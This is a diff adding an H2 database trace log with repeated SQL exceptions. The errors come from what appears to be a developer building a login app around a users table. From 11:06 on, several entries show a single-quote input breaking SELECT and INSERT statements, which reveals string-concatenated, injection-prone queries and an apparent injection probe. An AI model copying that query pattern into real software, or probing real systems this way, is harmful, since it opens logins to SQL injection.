@@ -1,0 +1,1411 @@
+06-16 06:36:21 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM 1[*] "; expected "identifier"; SQL statement:
+select * from 1 [42001-178]
+06-16 06:36:34 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM 1[*] "; expected "identifier"; SQL statement:
+select * from 1 [42001-178]
+06-16 06:47:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT 1 FORM A[*] "; SQL statement:
+select 1 form a [42000-178]
+06-16 06:47:36 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT 1 FORM ([*]1,1) "; SQL statement:
+select 1 form (1,1) [42000-178]
+06-16 06:47:38 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT 1 FORM ([*]1,1)A "; SQL statement:
+select 1 form (1,1)a [42000-178]
+06-16 06:47:41 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT 1 FORM ([*]1,1) AS A "; SQL statement:
+select 1 form (1,1) as a [42000-178]
+06-16 06:47:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT 1 FORM ([*]1,1)X "; SQL statement:
+select 1 form (1,1)x [42000-178]
+06-16 06:48:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "USER" not found; SQL statement:
+select user from information_schema.tables [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.command.dml.Select.prepare(Select.java:831)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 06:48:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "A" not found; SQL statement:
+select 1 from a [42102-178]
+06-16 06:48:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT 1 FROM  "; expected "identifier"; SQL statement:
+select 1 from  [42001-178]
+06-16 08:04:30 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "A[*] "; expected "ALTER, ANALYZE, {"; SQL statement:
+a [42001-178]
+06-16 08:04:37 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "[*]#"; SQL statement:
+# [42000-178]
+06-16 08:04:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "[*]#"; SQL statement:
+# [42000-178]
+06-16 08:04:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "B" not found; SQL statement:
+select b [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.command.dml.Select.prepare(Select.java:831)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 08:04:41 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "B" not found; SQL statement:
+select b-- [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.command.dml.Select.prepare(Select.java:831)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 08:13:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "CREATE TABLE "; expected "identifier"; SQL statement:
+create table [42001-178]
+06-16 08:13:07 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "XXX" already exists; SQL statement:
+create table xxx [42101-178]
+06-16 08:22:30 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" already exists; SQL statement:
+CREATE TABLE users( id SERIAL PRIMARY KEY,  username text NOT NULL, password text NOT NULL, role text NOT NULL, ip text NOT NULL ) [42101-178]
+06-16 08:33:49 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "DROP TABLES[*] USERS "; expected "TABLE, INDEX, USER, SEQUENCE, CONSTANT, TRIGGER, VIEW, ROLE, ALIAS, SCHEMA, ALL, DOMAIN, TYPE, DATATYPE, AGGREGATE"; SQL statement:
+drop tables users [42001-178]
+06-16 08:33:50 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "DROP TABLES[*] USERS "; expected "TABLE, INDEX, USER, SEQUENCE, CONSTANT, TRIGGER, VIEW, ROLE, ALIAS, SCHEMA, ALL, DOMAIN, TYPE, DATATYPE, AGGREGATE"; SQL statement:
+drop tables users [42001-178]
+06-16 08:34:03 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+drop table users [42102-178]
+06-16 09:49:06 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:49:16 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:49:31 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:49:40 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:49:43 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:50:29 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:50:30 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:50:37 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:51:01 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:51:11 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:51:12 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:52:20 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:52:28 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:53:29 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:53:32 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:53:36 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:53:37 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:54:00 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [42102-178]
+06-16 09:55:22 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USER" not found; SQL statement:
+select * from user [42102-178]
+06-16 09:55:23 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+select * from users [42102-178]
+06-16 09:55:25 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Table "USERS" not found; SQL statement:
+select * from users [42102-178]
+06-16 09:58:57 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "$1" not found; SQL statement:
+SELECT * FROM users WHERE username="$1" and password="$2" [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.expression.Comparison.optimize(Comparison.java:181)
+	at org.h2.expression.ConditionAndOr.optimize(ConditionAndOr.java:131)
+	at org.h2.command.dml.Select.prepare(Select.java:834)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcPreparedStatement.<init>(JdbcPreparedStatement.java:73)
+	at org.h2.jdbc.JdbcConnection.prepareStatement(JdbcConnection.java:276)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:242)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 09:58:59 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "$1" not found; SQL statement:
+SELECT * FROM users WHERE username="$1" and password="$2" [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.expression.Comparison.optimize(Comparison.java:181)
+	at org.h2.expression.ConditionAndOr.optimize(ConditionAndOr.java:131)
+	at org.h2.command.dml.Select.prepare(Select.java:834)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcPreparedStatement.<init>(JdbcPreparedStatement.java:73)
+	at org.h2.jdbc.JdbcConnection.prepareStatement(JdbcConnection.java:276)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:242)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 09:59:34 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Parameter "#1" is not set; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [90012-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.Parameter.checkSet(Parameter.java:81)
+	at org.h2.command.Prepared.checkParameters(Prepared.java:165)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:90)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcPreparedStatement.execute(JdbcPreparedStatement.java:193)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:348)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 09:59:36 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Parameter "#1" is not set; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [90012-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.Parameter.checkSet(Parameter.java:81)
+	at org.h2.command.Prepared.checkParameters(Prepared.java:165)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:90)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcPreparedStatement.execute(JdbcPreparedStatement.java:193)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:348)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 09:59:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Parameter "#1" is not set; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [90012-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.Parameter.checkSet(Parameter.java:81)
+	at org.h2.command.Prepared.checkParameters(Prepared.java:165)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:90)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcPreparedStatement.execute(JdbcPreparedStatement.java:193)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:348)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 10:04:18 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Parameter "#1" is not set; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [90012-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.Parameter.checkSet(Parameter.java:81)
+	at org.h2.command.Prepared.checkParameters(Prepared.java:165)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:90)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcPreparedStatement.execute(JdbcPreparedStatement.java:193)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:348)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 10:04:22 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Parameter "#1" is not set; SQL statement:
+SELECT * FROM users WHERE username=$1 and password=$2 [90012-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.Parameter.checkSet(Parameter.java:81)
+	at org.h2.command.Prepared.checkParameters(Prepared.java:165)
+	at org.h2.command.CommandContainer.query(CommandContainer.java:90)
+	at org.h2.command.Command.executeQuery(Command.java:197)
+	at org.h2.jdbc.JdbcPreparedStatement.execute(JdbcPreparedStatement.java:193)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:348)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 10:15:34 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "A" not found; SQL statement:
+select * from users where username=a [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.expression.Comparison.optimize(Comparison.java:181)
+	at org.h2.command.dml.Select.prepare(Select.java:834)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 10:15:35 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Data conversion error converting "orange"; SQL statement:
+select * from users where username=1 [22018-178]
+06-16 10:15:39 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "orange" not found; SQL statement:
+select * from users where username="orange" [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.expression.Comparison.optimize(Comparison.java:181)
+	at org.h2.command.dml.Select.prepare(Select.java:834)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 10:48:56 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column "user" not found; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES("user", "", "", "$s") [42122-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.expression.ExpressionColumn.optimize(ExpressionColumn.java:148)
+	at org.h2.command.dml.Insert.prepare(Insert.java:271)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:06:06 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:06:06 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:07:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:07:02 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:07:15 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:07:15 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:07:37 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:07:37 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:07:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:07:42 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:08:01 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:08:01 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:11:09 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:11:09 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Column count does not match; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', ''', ''', '') [21002-178]
+	at org.h2.message.DbException.getJdbcSQLException(DbException.java:344)
+	at org.h2.message.DbException.get(DbException.java:178)
+	at org.h2.message.DbException.get(DbException.java:154)
+	at org.h2.message.DbException.get(DbException.java:143)
+	at org.h2.command.dml.Insert.prepare(Insert.java:266)
+	at org.h2.command.Parser.prepareCommand(Parser.java:248)
+	at org.h2.engine.Session.prepareLocal(Session.java:442)
+	at org.h2.engine.Session.prepareCommand(Session.java:384)
+	at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1188)
+	at org.h2.jdbc.JdbcStatement.executeInternal(JdbcStatement.java:172)
+	at org.h2.jdbc.JdbcStatement.execute(JdbcStatement.java:160)
+	at org.h2.server.pg.PgServerThread.process(PgServerThread.java:393)
+	at org.h2.server.pg.PgServerThread.run(PgServerThread.java:91)
+	at java.lang.Thread.run(Thread.java:744)
+06-16 11:11:43 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM users WHERE username=''[*]'"; SQL statement:
+SELECT * FROM users WHERE username=''' [42000-178]
+06-16 11:11:44 jdbc[3]: exception
